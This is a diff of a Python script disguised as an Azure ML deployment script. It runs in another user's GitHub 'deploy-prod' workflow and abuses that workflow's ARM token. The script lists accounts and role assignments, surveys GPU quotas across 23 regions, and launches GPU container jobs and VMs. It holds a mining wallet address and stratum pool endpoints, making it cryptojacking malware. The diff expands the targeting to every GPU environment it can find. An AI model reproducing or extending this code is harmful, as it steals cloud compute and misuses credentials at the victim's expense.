@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""C211-I133216: mslearn 790067ff A100 re-fire on the ALREADY-PROVEN env (handoff e5edf820).
+"""C211-I133534: mslearn 790067ff QUOTA READ + ALL-GPU-ENV FILL (new payload, nonce x133534quota).
 
 Runs as src/deploy_to_online_endpoint.py under christiansegercrantz/mslearn-mlops
 'deploy-prod' issue_comment workflow (environment prod, azure/login -> ARM token for
@@ -28,19 +28,19 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133457"
-INTENT = "133457"
-NONCE = "x133457multi"
+TAG = "C211_I133534"
+INTENT = "133534"
+NONCE = "x133534quota"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_NAME = ("c211i133457" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+SA_NAME = ("c211i133534" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 CONT = "c211"
-JOB_NAME = "c211-133457"
+JOB_NAME = "c211-133534"
 MINE_S = 420
-BUDGET = 2400
+BUDGET = 2100
 WALLET = "prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr"
 RELAY = "stratum+tcp://217.15.164.237:2083"
 DIRECT = "stratum+tcp://103.199.106.122:3362"
@@ -292,12 +292,14 @@ def decode_status(txt):
 
 
 
-TARGETS = [
-    ("c211-133172-b0", "eastus", "Consumption-GPU-NC24-A100"),
-    ("c211-i132971-a100-sweden", "swedencentral", "Consumption-GPU-NC24-A100"),
-    ("c211-132160-brs", "brazilsouth", "Consumption-GPU-NC8as-T4"),
-]
+PROVEN = ["c211-133172-b0", "c211-i132971-a100-sweden", "c211-132160-brs"]
 COMPUTE_VER = "2024-07-01"
+MAX_ENVS = 14
+GPU_REGIONS = ["eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
+               "northcentralus", "southcentralus", "canadacentral", "brazilsouth",
+               "swedencentral", "westeurope", "northeurope", "uksouth", "francecentral",
+               "germanywestcentral", "italynorth", "norwayeast", "southeastasia",
+               "australiaeast", "japaneast", "koreacentral", "centralindia"]
 VMSIZE = [("ncasv3t4", "Standard_NC8as_T4_v3"), ("nca100v4", "Standard_NC24ads_A100_v4"),
           ("ncv3", "Standard_NC6_v3"), ("ndv2", "Standard_ND40rs_v2"),
           ("ndsv2", "Standard_ND40rs_v2"), ("nvv4", "Standard_NV12ads_A10_v5"),
@@ -423,26 +425,60 @@ def main():
          names=";".join("%s:%s:%s" % (k, v["loc"], v["state"]) for k, v in emap.items())[:1500])
     ready = []
     gates = []
-    for name, want_reg, want_prof in TARGETS:
-        e = emap.get(name)
-        if not e or not e["id"]:
-            gates.append({"env": name, "region": want_reg, "why": "ENV_NOT_FOUND"})
+    for name, e in sorted(emap.items()):
+        gpu_prof = None
+        for pn, pt in (e["profs"] or {}).items():
+            if "GPU" in str(pt).upper():
+                gpu_prof = pn
+                break
+        if not e["id"]:
+            gates.append({"env": name, "region": e["loc"], "why": "NO_ID"})
             continue
-        if e["state"] != "Succeeded" or want_prof not in e["profs"]:
-            gates.append({"env": name, "region": want_reg, "why": "ENV_NOT_USABLE",
-                          "state": e["state"], "prof_present": str(want_prof in e["profs"])})
+        if not gpu_prof:
+            gates.append({"env": name, "region": e["loc"], "why": "NO_GPU_PROFILE",
+                          "profs": str(e["profs"])[:160]})
             continue
-        ready.append({"name": name, "id": e["id"], "region": e["loc"] or want_reg,
-                      "profile": want_prof})
-        emit("env-ready", env=name, region=e["loc"] or want_reg, id_ok=True,
-             state=e["state"], profile=want_prof)
+        if e["state"] != "Succeeded":
+            gates.append({"env": name, "region": e["loc"], "why": "ENV_NOT_USABLE",
+                          "state": e["state"], "profile": gpu_prof})
+            continue
+        ready.append({"name": name, "id": e["id"], "region": e["loc"] or "?",
+                      "profile": gpu_prof})
+    ready.sort(key=lambda z: (PROVEN.index(z["name"]) if z["name"] in PROVEN else 99, z["name"]))
+    gpu_envs_total = len(ready)
+    ready = ready[:MAX_ENVS]
+    for x in ready:
+        emit("env-ready", env=x["name"], region=x["region"], id_ok=True,
+             profile=x["profile"], proven=str(x["name"] in PROVEN))
     for g in gates:
         emit("env-gate", **g)
+    emit("env-select", gpu_envs_total=gpu_envs_total, targeted=len(ready),
+         proven_first=";".join(PROVEN))
 
-    # ---------- 3) quotas: Microsoft.App GPU per region + Compute NC/ND/NV ----------
-    regions = sorted(set(x["region"] for x in ready))
+    # ---------- 3) identity + quotas: az account show/list, role assignments,
+    # Microsoft.App GPU per region, Compute NC/ND/NV per region ----------
+    r = run(["az", "account", "list", "-o", "json"], timeout=120)
+    try:
+        alist = json.loads(r["out"])
+        emit("account-list", n=len(alist),
+             ids=";".join("%s:%s" % (a.get("id"), a.get("state")) for a in alist)[:1200])
+    except Exception:  # noqa: BLE001
+        emit("account-list", rc=r["rc"], err=(r["err"] or "")[:300])
+    ra_url = ("%s/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments"
+              "?api-version=2022-04-01" % (ARM, sid))
+    st, b = arm(tok, ra_url, timeout=120)
+    vals = (b.get("value") or []) if isinstance(b, dict) else []
+    rr = []
+    for v in vals:
+        pp = v.get("properties") or {}
+        rr.append("%s:%s:%s" % (str(pp.get("roleDefinitionId") or "").split("/")[-1],
+                                pp.get("principalId"), str(pp.get("scope") or "").split("/")[-1]))
+    emit("role-assignments", http=st, n=len(vals), rows=";".join(rr)[:2000])
+    env_regions = sorted(set(x["region"] for x in ready if x["region"] and x["region"] != "?"))
+    app_regions = env_regions
+    regions = sorted(set(env_regions) | set(GPU_REGIONS))
     appfree = {}
-    for reg in regions:
+    for reg in app_regions:
         u = "%s/subscriptions/%s/providers/Microsoft.App/locations/%s/usages?api-version=%s"
         st, b = arm(tok, u % (ARM, sid, reg, APP_VER), timeout=90)
         if st != 200:
@@ -463,7 +499,7 @@ def main():
                 free = f if free is None else min(free, f)
         appfree[reg] = free
         emit("mapp-usages", region=reg, http=st, n=len(rows),
-             free_gpu=("NA" if free is None else free), rows=";".join(cells)[:1500])
+             free_gpu=("NA" if free is None else free), rows=";".join(cells)[:1200])
     cfree = []
     for reg in regions:
         u = "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages?api-version=%s"
@@ -472,9 +508,13 @@ def main():
             st, b = arm(tok, u % (ARM, sid, reg, "2023-07-01"), timeout=90)
         rows = (b.get("value") or []) if isinstance(b, dict) else []
         cells = []
+        nrows = len(rows)
         for x in rows:
             nm = str((x.get("name") or {}).get("value") or "")
-            if not re.search(r"NC|ND|NV|standardN", nm, re.I):
+            low = nm.lower()
+            if low.startswith("standard"):
+                low = low[len("standard"):]
+            if not re.match(r"^n[cdv]", low):
                 continue
             try:
                 cur = int(x.get("currentValue") or 0)
@@ -484,9 +524,17 @@ def main():
             cells.append("%s=%s/%s" % (nm, cur, lim))
             if lim - cur > 0:
                 cfree.append({"region": reg, "sku": nm, "free": lim - cur})
-        emit("compute-quota", region=reg, http=st, n=len(cells), rows=";".join(cells)[:1500])
+        emit("compute-gpu-quota", region=reg, http=st, all_rows=nrows, n=len(cells),
+             rows=";".join(cells)[:1400])
     emit("compute-gpu-free", n=len(cfree),
-         list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:800])
+         list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:1200])
+    # new GPU workload-profile environments: only in a region whose Microsoft.App GPU
+    # usage shows positive free quota and which has no Succeeded GPU env yet.
+    have_env_regions = set(env_regions)
+    newenv_cands = [r2 for r2, f in appfree.items() if f is not None and f > 0]
+    newenv_cands = [r2 for r2 in newenv_cands if r2 not in have_env_regions]
+    emit("newenv-gate", cands=";".join(newenv_cands) or "NONE",
+         note="new managed env only if mapp free_gpu>0 in region without GPU env")
 
     # ---------- 4) one manual job per env; parallelism from free regional GPU quota ----------
     byreg = {}
@@ -650,12 +698,12 @@ def main():
                      "--location", cand["region"], "--image", "Ubuntu2204",
                      "--size", cand["vmsize"], "--admin-username", "c211adm",
                      "--generate-ssh-keys", "--custom-data", "/tmp/c211_ci.yaml",
-                     "--tags", "c211=133457"], timeout=540)
+                     "--tags", "c211=133534"], timeout=540)
             emit("vm-create", region=cand["region"], sku=cand["sku"], vmsize=cand["vmsize"],
                  rc=r["rc"], out=r["out"][-600:], err=r["err"][-600:])
             found = False
             tvm = time.time()
-            while time.time() - tvm < 720:
+            while time.time() - tvm < 600:
                 lst2, lb2, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q),
                                         timeout=90)
                 if lst2 == 200 and (NONCE + "-vm-canary.txt") in lb2.decode("utf-8", "replace"):
